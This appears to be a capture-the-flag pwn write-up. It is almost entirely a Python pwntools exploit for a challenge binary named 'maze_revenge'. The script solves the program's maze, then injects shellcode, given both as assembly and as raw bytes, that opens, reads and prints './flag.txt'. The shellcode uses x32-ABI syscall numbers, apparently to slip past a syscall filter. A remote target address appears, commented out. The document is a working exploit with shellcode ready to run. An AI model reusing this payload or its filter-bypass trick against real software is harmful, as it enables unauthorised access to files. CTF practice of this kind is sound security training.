# PWN

## Exploit 
> By: [Kirin@梅零落](https://www.jianshu.com/u/6c3ca9f6fd42)

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *
context.log_level="debug"
def mark(maze,pos):  
    maze[pos[0]][pos[1]]=2
 
def passable(maze,pos): 
    return maze[pos[0]][pos[1]]==0
 
def find_path(maze,pos,end):
    mark(maze,pos)
    if pos==end:
        path.append(pos)
        return True
    for i in range(4):     
        nextp=pos[0]+dirs[i][0],pos[1]+dirs[i][1]
        if passable(maze,nextp):     
            if find_path(maze,nextp,end):
                path.append(pos)
                return True
    return False
p=process("./maze_revenge")
#p=remote("192.168.30.60",20001)
p.recvuntil("maze size:44, start(2,1), end(")
x=int(p.recvuntil(",")[:-1])
y=int(p.recvuntil(")")[:-1])
m=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]
map_=[]
map_.append(m)
map_.append(m)
p.recvuntil("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n")
p.recvuntil("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n")
for i in range(50): 
     s=p.recvuntil("\n").strip() 
     tmp=[]
     if s!="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx":
              for i in s:
                  if i=='x':
                        tmp.append(1)
                  else:
                        tmp.append(0)    
              map_.append(tmp)
     else:
           map_.append(m)
           map_.append(m)
           break
dirs=[(0,1),(1,0),(0,-1),(-1,0)] 
path=[]           

maze=map_
start=(2,1)
end=(x,y)
find_path(maze,start,end)
print path
ans=""
for i in range(len(path)-1):
      next=path[i]
      now=path[i+1]
      if now[0]==next[0]:
              if next[1]>now[1]:
                     ans+="d"
              else:
                      ans+="a"
      else:

               if next[0]>now[0]:
                     ans+="s"
               else:
                      ans+="w"
p.sendline(ans[::-1]+" ")
p.sendlineafter("> ","1")
'''
#flag.txt
    push  0
    push 0x1010101 ^ 0x7478
    xor dword ptr [rsp], 0x1010101
    mov rax, 0x742e67616c662f2e
    push rax
	mov rdi, rsp
	xor edx, edx /* 0 */
	xor esi, esi /* 0 */
	mov rax,0x40000002
	syscall

	mov rdi, rax
	sub rsp, 0x1000
	lea rsi, [rsp]
	mov rdx, 0x1000
	mov rax, 0x40000000
	syscall

	mov rdi, 1
	mov rdx, rax
	mov rax, 0x40000001
	syscall

	mov rax, 0x4000003c
	xor rdi, rdi
	syscall
'''
payload="j\x00hyu\x01\x01\x814$\x01\x01\x01\x01H\xb8./flag.tPH\x89\xe71\xd21\xf6H\xc7\xc0\x02\x00\x00@\x0f\x05H\x89\xc7H\x81\xec\x00\x10\x00\x00H\x8d4$H\xc7\xc2\x00\x10\x00\x00H\xc7\xc0\x00\x00\x00@\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\x89\xc2H\xc7\xc0\x01\x00\x00@\x0f\x05H\xc7\xc0<\x00\x00@H1\xff\x0f\x05"
#gdb.attach(p)
p.sendlineafter("success\n",payload+"\x90\x90")
p.interactive()

```
